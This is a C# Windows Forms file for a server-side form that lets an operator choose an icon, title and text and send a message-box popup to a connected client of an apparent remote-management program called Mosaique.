using Serveur.Controllers.Server;
using System;
using System.Drawing;
using System.Windows.Forms;


namespace Serveur.Views
{
    public partial class FrmSendMessageBox : Form
    {
        private ClientMosaique _client;
        public int icon = 5;

        public FrmSendMessageBox(ClientMosaique client)
        {
            _client = client;
            InitializeComponent();
        }

        private void btnSend_Click(object sender, EventArgs e)
        {
            new MosaiqueServeur.Packets.ServerPackets.SendMessageBox(icon, txtTitle.Text, txtMsg.Text).Execute(_client);
        }

        private void btnInfo_Click(object sender, EventArgs e)
        {
            icon = 1;
        }
        private void btnIntero_Click(object sender, EventArgs e)
        {
            icon = 2;
        }
        private void btnCross_Click(object sender, EventArgs e)
        {
            icon = 3;
        }
        private void btnDanger_Click(object sender, EventArgs e)
        {
            icon = 4;
        }
        private void btnNone_Click(object sender, EventArgs e)
        {
            icon = 5;
        }

        private void FrmSendMessageBox_Load(object sender, EventArgs e)
        {
        }
    }
}
